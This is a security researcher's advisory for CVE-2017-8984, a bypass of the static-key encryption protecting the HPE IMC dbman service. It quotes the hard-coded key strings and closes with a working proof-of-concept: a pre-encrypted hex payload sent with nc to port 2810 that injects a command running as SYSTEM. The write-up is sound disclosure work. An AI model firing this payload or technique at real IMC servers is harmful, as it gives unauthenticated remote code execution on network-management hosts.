# HPE IMC dbman Unauthenticated Remote Code Execution (CVE-2017-8984)

October 6, 2017

## Advisory

https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-hpesbhf03811en_us

## Affected Vendor:

Hewlett Packard Enterprise

## Affected Components:

dbman in HPE IMC version 7.3 E0506P03

## Vulnerability Details:

In June 2017, I reported a vulnerability in HPE IMC that allowed an attacker to bypass the patch for multiple 
vulnerabilities in dbman. This vulnerability was assigned CVE-2017-8958 and its security bulletin can be found here:

http://h20565.www2.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbhf03786en_us

To summarize the previous report, there were multiple vulnerabilities disclosed in dbman that included 
command injection, arbitrary file write, and arbitrary file deletion. Their security bulletins can be found here:

https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us (CVE-2017-5816, CVE-2017-5817, CVE-2017-5818, CVE-2017-5819)
https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03746en_us (CVE-2017-5820, CVE-2017-5821, CVE-2017-5822, CVE-2017-5823)
https://h20565.www2.hpe.com/hpsc/doc/public/display?docId=hpesbhf03764en_us (CVE-2017-8954, CVE-2017-8955, CVE-2017-8957)

The initial patch attempted to fix the problem by encrypting the ASN.1 encoded messages using a static key derived
from the string "liuan814". Then when the service received a message, it decrypted it using the same static key. An
attacker could bypass this protection by emulating the encryption done by dbman and encrypting their malicious payload.
Since a static key is used for this encryption scheme, the encrypted malicious payload would be successfully
decrypted by all installations of IMC.

The latest patch for CVE-2017-8958 attempts to fix the problem by using a different static key, derived from the
string "liubn825". This does not fix the problem. Setting aside the similarities of the old key and the new
key, a different static key is an insufficient fix for this problem. I must emphasize that retrieving a static key
is trivial for an attacker and can be done with a common utility like Process Explorer, which can list the strings 
contained in a program. To reiterate, an attacker just needs to encrypt their malicious payload once and then they 
will be able to exploit any IMC server running the latest, fully patched version. Thus the protection put in place
is insufficient and all of the aforementioned dbman commands are vulnerable.

The impact of the vulnerability is remote, unauthenticated command execution, arbitrary file write, and arbitrary 
file deletion as SYSTEM or root.

## Remediation:

An authentication mechanism must be implemented to protect the dbman service. A static key is insufficient and a 
key unique to each installation must be securely negotiated before the dbman service accepts any commands. 
Furthermore, each individual dbman vulnerability must by fixed by targeting the root cause - lack of input validation. 

## Proof of Concept:

A proof-of-concept has been provided to demonstrate the impact of the vulnerability.
To run it, first set the IMC_SERVER environment variable to the IP address of a running and fully patched 
IMC server installed on Windows (version 7.3 E0506P03):
```
export IMC_SERVER=<IP_ADDRESS>
```
Then run the following to exploit the BackupZipFile command (opcode 10004/0x2714):
```
echo '00002714000000b8be1c461adda3576caff83c299f78f9c1685a33b47e444b644afa7289a0d2a3a3f61b02bf1dc01332db19f3121b725583874ba365e19d7a90625d8657a6db97cae6ff959b8553fba605661d76d0cc03b1c166d64d9a0f3d0b842163a9c79230a71e1955c28033b15a39b02afe6e0942865f4773b7af613dbca6aa36877f3b7d79a52aa258bd9d9a87b74307ec81a3ee3601209a0f5da7eccac2655d721064f90235bf539c8bba68eb16800309ba15be32efc962f2c10d80e7' | xxd -r -p | nc $IMC_SERVER 2810
```
Result: 
  - The file "proof_of_concept" appears in the root directory of the C drive with the contents "test-BackupZipFile"
  - Command injected: "echo test-BackupZipFile >> C:\proof_of_concept & " (in sqlScript field)
  - Command executed: "cmd.exe /c echo test-BackupZipFile >> C:\proof_of_concept & "test3" test1 test7 test5 >"C:\Program Files\iMC\dbman\bin\dbop.sql.log" 2>&1"
